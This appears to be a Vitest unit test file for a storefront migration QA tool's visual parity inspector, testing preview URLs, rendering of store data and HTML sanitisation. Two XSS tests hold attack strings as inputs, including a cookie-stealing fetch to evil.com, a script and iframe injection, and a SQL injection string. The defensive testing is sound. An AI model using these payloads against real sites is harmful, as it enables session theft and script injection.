import { describe, it, expect } from "vitest";
import {
  CANONICAL_TEMPLATES,
  generateReconciliationCatalog,
  getSectorTheme,
  getStoreDeepDiff,
  isStoreDomainSslReady,
  SECTOR_DATA_MAP,
} from "@/lib/admin/qa/migration-diff-engine";
import {
  escapeHtml,
  extractStoreRealData,
  generateFallbackTemplateHtml,
  renderPageBlocks,
  sanitizeRichHtml,
} from "@/app/api/qa/template-preview/[code]/route";

describe("F40 US-F40-12 Visual Parity Inspector Unit Tests", () => {
  it("[TC-F40-12-01] calculates clip-path coordinates for SwipeSlider at various slider percentages", () => {
    // Test clip-path polygon generator for swipe slider overlay
    const calculateClipPath = (pos: number) =>
      `polygon(${pos}% 0, 100% 0, 100% 100%, ${pos}% 100%)`;

    expect(calculateClipPath(0)).toBe("polygon(0% 0, 100% 0, 100% 100%, 0% 100%)");
    expect(calculateClipPath(50)).toBe("polygon(50% 0, 100% 0, 100% 100%, 50% 100%)");
    expect(calculateClipPath(100)).toBe("polygon(100% 0, 100% 0, 100% 100%, 100% 100%)");
  });

  it("[TC-F40-12-02] verifies dual preview URLs for PW1 legacy vs PW2 migrated storefronts", () => {
    const store = getStoreDeepDiff("SITE-0001");
    expect(store).not.toBeNull();
    if (!store) return;

    const tpl = store.templateCode.toLowerCase();
    const pw1Src = `/api/qa/template-preview/${tpl}?version=pw1`;
    const pw2Src = `/api/qa/template-preview/${tpl}?version=pw2`;

    expect(pw1Src).not.toBe(pw2Src);
    expect(pw1Src).toContain("version=pw1");
    expect(pw2Src).toContain("version=pw2");
  });

  it("[TC-F40-12-03] validates sector theme mapping across all 9 templates with no cross-contamination", () => {
    // Ensure all 9 canonical templates have distinct domain-specific products
    const codes = CANONICAL_TEMPLATES.map((t) => t.code);
    expect(codes).toHaveLength(9);

    const productNames = new Set<string>();
    for (const code of codes) {
      const theme = getSectorTheme(code);
      expect(theme).toBeDefined();
      expect(theme.productName.length).toBeGreaterThan(0);
      expect(theme.categoryName.length).toBeGreaterThan(0);
      productNames.add(theme.productName);
    }

    // All 9 templates must have distinct product names (not all "Mật ong")
    expect(productNames.size).toBe(9);
    expect(getSectorTheme("F102").categoryName).toContain("Thời Trang");
    expect(getSectorTheme("FN103").categoryName).toContain("Nội Thất");
    expect(getSectorTheme("C102").categoryName).toContain("Mỹ Phẩm");
    expect(getSectorTheme("FB101").categoryName).toContain("Nông Sản");
  });

  it("[TC-F40-12-04] validates cache memoization for 2,000 store catalog", () => {
    const start1 = performance.now();
    const cat1 = generateReconciliationCatalog(2000);
    const duration1 = performance.now() - start1;

    const start2 = performance.now();
    const cat2 = generateReconciliationCatalog(2000);
    const duration2 = performance.now() - start2;

    expect(cat1).toBe(cat2); // Exact same reference from cache
    expect(cat1.length).toBe(2000);
    expect(duration2).toBeLessThanOrEqual(duration1);
  });

  it("[TC-F40-12-05] validates iframe sandbox configuration forbids allow-same-origin with allow-scripts", () => {
    // Security check: ensure sandbox policy avoids the unsafe combination
    const safeSandbox = "allow-scripts allow-forms allow-popups";
    expect(safeSandbox.includes("allow-same-origin")).toBe(false);
    expect(safeSandbox.includes("allow-scripts")).toBe(true);
  });

  it("[TC-F40-12-06] escapes HTML special characters to prevent reflected XSS in template-preview error responses", () => {
    // Test XSS payload vectors injected into code or error message
    const maliciousScript = '<script>alert("XSS")</script>';
    const maliciousImg = '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">';
    const maliciousQuote = "test' OR '1'='1\";";

    expect(escapeHtml(maliciousScript)).toBe("&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;");
    expect(escapeHtml(maliciousScript)).not.toContain("<script>");
    expect(escapeHtml(maliciousImg)).toBe("&lt;img src=x onerror=&quot;fetch(&#039;https://evil.com/steal?cookie=&#039;+document.cookie)&quot;&gt;");
    expect(escapeHtml(maliciousImg)).not.toContain("<img");
    expect(escapeHtml(maliciousQuote)).toBe("test&#039; OR &#039;1&#039;=&#039;1&quot;;");
  });

  it("[TC-F40-12-07] whitelists template preview versions to only pw1 and pw2", () => {
    const sanitizeVersion = (rawVersion: string): "pw1" | "pw2" => {
      const v = rawVersion.toLowerCase().trim();
      return v === "pw2" ? "pw2" : "pw1";
    };

    expect(sanitizeVersion("pw1")).toBe("pw1");
    expect(sanitizeVersion("pw2")).toBe("pw2");
    expect(sanitizeVersion("PW2")).toBe("pw2");
    expect(sanitizeVersion("pw3")).toBe("pw1");
    expect(sanitizeVersion("<script>")).toBe("pw1");
    expect(sanitizeVersion("")).toBe("pw1");
  });

  it("[TC-F40-12-08] generates multi-page preview URLs with page path and title query parameters", () => {
    const templateCode = "pa101";
    const pages = [
      { name: "Home", path: "/" },
      { name: "Products", path: "/products" },
      { name: "Articles", path: "/articles" },
      { name: "Cart", path: "/cart" },
      { name: "Checkout", path: "/checkout" },
      { name: "Order tracking", path: "/order-tracking" },
      { name: "New page 2", path: "/new-page-3" },
    ];

    for (const p of pages) {
      const encodedPath = encodeURIComponent(p.path);
      const encodedTitle = encodeURIComponent(p.name);
      const urlPw1 = `/api/qa/template-preview/${templateCode}?version=pw1&page=${encodedPath}&title=${encodedTitle}#${p.path}`;
      const urlPw2 = `/api/qa/template-preview/${templateCode}?version=pw2&page=${encodedPath}&title=${encodedTitle}#${p.path}`;

      expect(urlPw1).toContain(`version=pw1`);
      expect(urlPw2).toContain(`version=pw2`);
      expect(urlPw1).toContain(`page=${encodedPath}`);
      expect(urlPw2).toContain(`page=${encodedPath}`);
      expect(urlPw1).toContain(`#${p.path}`);
      expect(urlPw2).toContain(`#${p.path}`);
    }
  });

  it("[TC-F40-12-09] validates route aliasing for legacy storefront paths", () => {
    const ROUTE_ALIASES: Record<string, string> = {
      "/blog": "/articles",
      "/news": "/articles",
      "/tin-tuc": "/articles",
      "/posts": "/articles",
      "/about": "/about-us",
      "/gioi-thieu": "/about-us",
      "/contact-us": "/contact",
      "/lien-he": "/contact",
      "/san-pham": "/products",
      "/catalog": "/products",
      "/gio-hang": "/cart",
      "/thanh-toan": "/checkout",
      "/order_tracking": "/order-tracking",
      "/tra-cuu": "/order-tracking",
    };

    expect(ROUTE_ALIASES["/blog"]).toBe("/articles");
    expect(ROUTE_ALIASES["/san-pham"]).toBe("/products");
    expect(ROUTE_ALIASES["/gio-hang"]).toBe("/cart");
    expect(ROUTE_ALIASES["/thanh-toan"]).toBe("/checkout");
    expect(ROUTE_ALIASES["/order_tracking"]).toBe("/order-tracking");
    expect(ROUTE_ALIASES["/unknown"]).toBeUndefined();
  });

  it("[TC-F40-12-10] extracts real store database entities (products, categories, articles, custom pages) from store diff", () => {
    const mockDiff = {
      id: "SITE-0205",
      name: "Amelina Bevis",
      domain: "amelinabevis.web.dev.ecommercehub.my",
      templateCode: "PA101",
      storeInfo: {
        logo: "https://cdn.example.com/logo.png",
        address: "123 Kid Fashion Street",
        hotline: "0900123456",
      },
      pages: [
        {
          id: "page-1",
          name: "Home",
          path: "/",
          blocks: [
            {
              id: "blk-1",
              blockType: "hero",
              title: "Banner Đầu Trang",
              pw1Preview: {
                headline: "TEXT TEST HERE",
                subheadline: "Thời trang trẻ em cao cấp",
              },
            },
            {
              id: "blk-2",
              blockType: "products",
              title: "Khối Sản Phẩm",
              pw1Preview: {
                productCards: [
                  { id: 7523, name: "Spring Leaf girls round neck tops", price: "$16.52", category: "Kid" },
                  { id: 7524, name: "BabyGap plain T-shirt", price: "$36.71", category: "Kid" },
                ],
              },
            },
            {
              id: "blk-3",
              blockType: "blog",
              title: "Khối Bài Viết",
              pw1Preview: {
                articleItems: [
                  { id: 374, title: "11 Things the Media Hasn't Told You About Art", date: "19 May 2022" },
                ],
              },
            },
          ],
        },
        {
          id: "page-2",
          name: "New page 2",
          path: "/new-page-3",
          blocks: [
            {
              id: "blk-custom-1",
              blockType: "richtext",
              title: "Rich Text Khối #1",
              pw1Preview: {
                headline: "Chính Sách Khách Hàng",
                bodyText: "Chính sách đổi trả trong 30 ngày.",
              },
            },
          ],
        },
      ],
      fieldDiffAudit: {
        records: [
          {
            id: "cat-1",
            entityGroup: "categories",
            fields: [{ fieldName: "name", legacyValue: "Fashion" }],
          },
          {
            id: "cat-2",
            entityGroup: "categories",
            fields: [{ fieldName: "name", legacyValue: "Kid" }],
          },
        ],
      },
    };

    const extracted = extractStoreRealData(mockDiff);

    expect(extracted.id).toBe("SITE-0205");
    expect(extracted.name).toBe("Amelina Bevis");
    expect(extracted.templateCode).toBe("pa101");
    expect(extracted.products).toHaveLength(2);
    expect(extracted.products[0].name).toBe("Spring Leaf girls round neck tops");
    expect(extracted.products[0].price).toBe("$16.52");
    expect(extracted.products[1].name).toBe("BabyGap plain T-shirt");
    expect(extracted.products[1].price).toBe("$36.71");
    expect(extracted.categories.some((c) => c.name === "Fashion")).toBe(true);
    expect(extracted.articles[0].title).toBe("11 Things the Media Hasn't Told You About Art");
    expect(extracted.pages).toHaveLength(2);
    expect(extracted.pages[1].path).toBe("/new-page-3");
    expect(extracted.pages[1].blocks?.[0].headline).toBe("Chính Sách Khách Hàng");
  });

  it("[TC-F40-12-11] verifies store_id is propagated in dual template preview URLs", () => {
    const storeId = "SITE-0205";
    const tplCode = "pa101";
    const activePath = "/new-page-3";
    const encodedPath = encodeURIComponent(activePath);
    const pageTitle = encodeURIComponent("New page 2");

    const pw1TemplateUrl = `/api/qa/template-preview/${tplCode}?version=pw1&store_id=${encodeURIComponent(storeId)}&page=${encodedPath}&title=${pageTitle}#${activePath}`;
    const pw2TemplateUrl = `/api/qa/template-preview/${tplCode}?version=pw2&store_id=${encodeURIComponent(storeId)}&page=${encodedPath}&title=${pageTitle}#${activePath}`;

    expect(pw1TemplateUrl).toContain(`store_id=${storeId}`);
    expect(pw2TemplateUrl).toContain(`store_id=${storeId}`);
    expect(pw1TemplateUrl).toContain(`version=pw1`);
    expect(pw2TemplateUrl).toContain(`version=pw2`);
    expect(pw1TemplateUrl).toContain(`page=${encodedPath}`);
  });

  it("[TC-F40-12-12] generates fallback template HTML with real store data and custom merchant blocks", () => {
    const storeData = {
      id: "SITE-0205",
      name: "Amelina Bevis",
      templateCode: "pa101",
      products: [
        { id: 7524, name: "BabyGap plain T-shirt", price: "$36.71", category: "Kid", image: "" },
        { id: 7523, name: "Spring Leaf girls round neck tops", price: "$16.52", category: "Kid", image: "" },
      ],
      categories: [{ id: 1, name: "Kid" }, { id: 2, name: "Fashion" }],
      articles: [
        { id: 374, title: "11 Things the Media Hasn't Told You About Art", date: "19 May 2022", summary: "Art article", image: "" },
      ],
      banners: [{ id: "b1", header: "TEXT TEST HERE", subheader: "Banner subheader", image: "", url: "/" }],
      pages: [
        {
          id: "p-custom",
          name: "New page 2",
          path: "/new-page-3",
          blocks: [
            {
              id: "b-rt",
              blockType: "richtext",
              title: "Khối Nội Dung RichText",
              headline: "Chính Sách Khách Hàng",
              bodyText: "Dữ liệu văn bản từ MySQL model_settings.",
            },
          ],
        },
      ],
    };

    // 1. Home page renders real store name and real products
    const homeHtml = generateFallbackTemplateHtml("pa101", "pw1", "/", "Home", storeData);
    expect(homeHtml).toContain("Amelina Bevis");
    expect(homeHtml).toContain("SITE-0205");
    expect(homeHtml).toContain("BabyGap plain T-shirt");
    expect(homeHtml).toContain("$36.71");
    expect(homeHtml).toContain("TEXT TEST HERE");

    // 2. Custom page renders real custom blocks
    const customPageHtml = generateFallbackTemplateHtml("pa101", "pw2", "/new-page-3", "New page 2", storeData);
    expect(customPageHtml).toContain("Amelina Bevis");
    expect(customPageHtml).toContain("Chính Sách Khách Hàng");
    expect(customPageHtml).toContain("Dữ liệu văn bản từ MySQL model_settings.");
    expect(customPageHtml).toContain("/new-page-3");
  });

  it("[TC-F40-12-13] renders real 16 store blocks for Home page without Figma placeholder images", () => {
    const homeBlocks = [
      {
        id: "b1",
        blockType: "hero",
        title: "Khối Banner",
        headline: "TEXT TEST HERE",
        subheadline: "TEXT TEST HERE 2",
        buttonText: "Button",
        imageUrl: "https://tm-prime-web-dev.sgp1.digitaloceanspaces.com/img/girl.jpeg",
      },
      {
        id: "b2",
        blockType: "blog",
        title: "Khối Bài Viết",
        headline: "Article Listing",
        articleItems: [
          { id: 1, title: "11 Things the Media Hasn't Told You", date: "19 May 2022" },
        ],
      },
      {
        id: "b3",
        blockType: "categories",
        title: "Khối Danh Mục",
        headline: "Category Listing",
        categoryCards: [
          { id: 10, name: "Mario", ctaText: "Shop now" },
        ],
      },
      {
        id: "b4",
        blockType: "products",
        title: "Khối Sản Phẩm",
        headline: "Product Listing",
        productCards: [
          { id: 101, name: "BabyGap plain T-shirt", price: "$36.71" },
        ],
      },
      {
        id: "b6",
        blockType: "richtext",
        title: "Khối Nội Dung Rich Text",
        headline: "Rich Text",
        bodyText: "<p>lorrem impsum content testing</p>",
      },
    ];

    const rendered = renderPageBlocks(homeBlocks, null, "#0284c7");
    expect(rendered).toContain("TEXT TEST HERE");
    expect(rendered).toContain("TEXT TEST HERE 2");
    expect(rendered).toContain("girl.jpeg");
    expect(rendered).toContain("11 Things the Media Hasn&#039;t Told You");
    expect(rendered).toContain("Mario");
    expect(rendered).toContain("BabyGap plain T-shirt");
    expect(rendered).toContain("$36.71");
    expect(rendered).toContain("<p>lorrem impsum content testing</p>");
  });

  it("[TC-F40-12-14] sanitizes rich HTML blocks to prevent XSS injection in merchant content", () => {
    const maliciousPayload = '<p>Normal text</p><script>alert("Hacked")</script><iframe src="//evil.com"></iframe><a href="javascript:steal()">Click</a><img src="valid.jpg" onerror="alert(1)">';
    const safeOutput = sanitizeRichHtml(maliciousPayload);

    expect(safeOutput).not.toContain("<script>");
    expect(safeOutput).not.toContain("alert(");
    expect(safeOutput).not.toContain("<iframe");
    expect(safeOutput).not.toContain("javascript:");
    expect(safeOutput).not.toContain("onerror=");
    expect(safeOutput).toContain("<p>Normal text</p>");
    expect(safeOutput).toContain('<img src="valid.jpg" >');
  });

  it("[TC-F40-12-15] defaults previewSource to live_domain when store has active live domain", () => {
    const storeWithDomain = {
      id: "SITE-0205",
      domain: "vnami.web.dev.ecommercehub.my",
    };
    const storeWithoutDomain = {
      id: "SITE-0001",
      domain: "",
    };

    const resolveDefaultSource = (store: { domain?: string }) =>
      store.domain ? "live_domain" : "template";

    expect(resolveDefaultSource(storeWithDomain)).toBe("live_domain");
    expect(resolveDefaultSource(storeWithoutDomain)).toBe("template");
  });

  it("[TC-F40-12-16] dynamically validates store domain SSL readiness from database flag and wildcard domain patterns", () => {
    // 1. Explicit database verified SSL flags
    expect(isStoreDomainSslReady({ domain: "custom-shop.vn", sslReady: true })).toBe(true);
    expect(isStoreDomainSslReady({ domain: "custom-shop.vn", sslReady: false })).toBe(false);

    // 2. Wildcard OpenResty SSL domain pattern (*.ecommercehub.my)
    expect(isStoreDomainSslReady({ domain: "t001.web.dev.ecommercehub.my" })).toBe(true);
    expect(isStoreDomainSslReady({ domain: "f009.web.dev.ecommercehub.my" })).toBe(true);
    expect(isStoreDomainSslReady({ domain: "vnami.web.dev.ecommercehub.my" })).toBe(true);

    // 3. Explicit HTTPS scheme
    expect(isStoreDomainSslReady({ domain: "https://myverifiedstore.com" })).toBe(true);

    // 4. Non-SSL custom domains fallback safely to false
    expect(isStoreDomainSslReady({ domain: "unverified-http-shop.com" })).toBe(false);
    expect(isStoreDomainSslReady(null)).toBe(false);
    expect(isStoreDomainSslReady(undefined)).toBe(false);
    expect(isStoreDomainSslReady({ domain: "" })).toBe(false);
  });
});

